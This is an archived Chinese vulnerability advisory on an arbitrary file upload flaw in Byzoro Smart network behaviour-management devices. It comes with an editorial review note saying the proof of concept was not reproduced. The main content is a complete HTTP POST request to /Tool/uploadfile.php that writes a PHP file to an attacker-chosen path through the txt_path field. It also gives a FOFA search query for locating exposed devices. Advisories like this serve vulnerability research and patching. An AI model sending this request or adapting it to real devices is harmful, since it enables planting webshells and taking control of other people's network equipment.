---
source: "wy876 漏洞文库"
id: "vw-1970099669ba9e12168ad4b7"
entity_id: "ve-1970099669ba9e12168ad4b7"
schema_version: "1"
title: "百卓Smart uploadfile存在任意文件上传漏洞"
product: "Byzoro Smart"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "带PHPSESSID；角色/版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%99%BE%E5%8D%93/%E7%99%BE%E5%8D%93Smartuploadfile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bpwixrcymsyfg62k"
source_status: "recorded"
---

# 百卓Smart uploadfile存在任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Byzoro Smart
- 本文讨论：Tool/uploadfile.php txt_path任意写入
- 版本、权限与配置前提：带PHPSESSID；角色/版本未知
- 资料类型：文件上传请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- /home/helloworld.php究竟磁盘或URL路径未区分，上传成功不等于PHP执行
- 缺响应/修复以及登录前提说明
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 可控路径范围、认证角色及固件待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。百卓Smart uploadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征


# 四、漏洞复现
```http
POST /Tool/uploadfile.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=942c6029711a902ca974ac33efcdb383
Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
Content-Length: 409
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="file_upload"; filename="contents.php"
Content-Type: application/octet-stream

<?php echo '<p>Hello World</p>'; ?>
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="txt_path"

/home/helloworld.php
-----------------------------13979701222747646634037182887--
```


上传文件位置

```plain
/home/helloworld.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bpwixrcymsyfg62k>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
